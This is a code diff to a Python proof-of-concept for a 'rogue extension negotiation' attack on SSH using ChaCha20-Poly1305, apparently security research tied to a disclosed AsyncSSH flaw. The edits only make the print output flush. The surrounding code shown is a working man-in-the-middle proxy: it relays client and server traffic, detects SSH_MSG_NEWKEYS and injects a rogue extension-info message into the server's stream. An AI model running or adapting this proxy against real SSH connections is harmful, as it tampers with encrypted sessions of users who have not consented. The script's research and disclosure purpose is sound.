@@ -20,21 +20,21 @@ import click
 @click.option("--server-ip", help="The IP address where the AsyncSSH server is running.")
 @click.option("--server-port", default=22, help="The port where the AsyncSSH server is running.")
 def cli(proxy_ip, proxy_port, server_ip, server_port):
-    print("--- Proof of Concept for the rogue extension negotiation attack (ChaCha20-Poly1305) ---")
+    print("--- Proof of Concept for the rogue extension negotiation attack (ChaCha20-Poly1305) ---", flush=True)
     mitm_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     mitm_socket.bind((proxy_ip, proxy_port))
     mitm_socket.listen(5)
 
-    print(f"[+] MitM Proxy started. Listening on {(proxy_ip, proxy_port)} for incoming connections...")
+    print(f"[+] MitM Proxy started. Listening on {(proxy_ip, proxy_port)} for incoming connections...", flush=True)
 
     try:
         while True:
             client_socket, client_addr = mitm_socket.accept()
-            print(f"[+] Accepted connection from: {client_addr}")
-            print(f"[+] Establishing new server connection to {(server_ip, server_port)}.")
+            print(f"[+] Accepted connection from: {client_addr}", flush=True)
+            print(f"[+] Establishing new server connection to {(server_ip, server_port)}.", flush=True)
             server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
             server_socket.connect((server_ip, server_port))
-            print("[+] Spawning new forwarding threads to handle client connection.")
+            print("[+] Spawning new forwarding threads to handle client connection.", flush=True)
             Thread(target=forward_client_to_server, args=(client_socket, server_socket)).start()
             Thread(target=forward_server_to_client, args=(client_socket, server_socket)).start()
     except KeyboardInterrupt:
@@ -65,8 +65,8 @@ def forward_client_to_server(client_socket, server_socket):
                 break
             server_socket.send(client_data)
     except ConnectionResetError:
-        print("[!] Client connection has been reset. Continue closing sockets.")
-    print("[!] forward_client_to_server thread ran out of data, closing sockets!")
+        print("[!] Client connection has been reset. Continue closing sockets.", flush=True)
+    print("[!] forward_client_to_server thread ran out of data, closing sockets!", flush=True)
     client_socket.close()
     server_socket.close()
 
@@ -75,20 +75,20 @@ def forward_server_to_client(client_socket, server_socket):
         while True:
             server_data = server_socket.recv(4096)
             if contains_newkeys(server_data):
-                print("[+] SSH_MSG_NEWKEYS sent by server identified!")
+                print("[+] SSH_MSG_NEWKEYS sent by server identified!", flush=True)
                 if len(server_data) < NEW_KEYS_LENGTH + SERVER_EXT_INFO_LENGTH:
-                    print("[+] server_data does not contain all messages sent by the server yet. Receiving additional bytes until we have 692 bytes buffered!")
+                    print("[+] server_data does not contain all messages sent by the server yet. Receiving additional bytes until we have 692 bytes buffered!", flush=True)
                 while len(server_data) < NEW_KEYS_LENGTH + SERVER_EXT_INFO_LENGTH:
                     server_data += server_socket.recv(4096)
-                print(f"[d] Original server_data before modification: {server_data.hex()}")
+                print(f"[d] Original server_data before modification: {server_data.hex()}", flush=True)
                 server_data = insert_rogue_ext_info(server_data)
-                print(f"[d] Modified server_data with rogue extension info: {server_data.hex()}")
+                print(f"[d] Modified server_data with rogue extension info: {server_data.hex()}", flush=True)
             if len(server_data) == 0:
                 break
             client_socket.send(server_data)
     except ConnectionResetError:
-        print("[!] Target connection has been reset. Continue closing sockets.")
-    print("[!] forward_server_to_client thread ran out of data, closing sockets!")
+        print("[!] Target connection has been reset. Continue closing sockets.", flush=True)
+    print("[!] forward_server_to_client thread ran out of data, closing sockets!", flush=True)
     client_socket.close()
     server_socket.close()
 
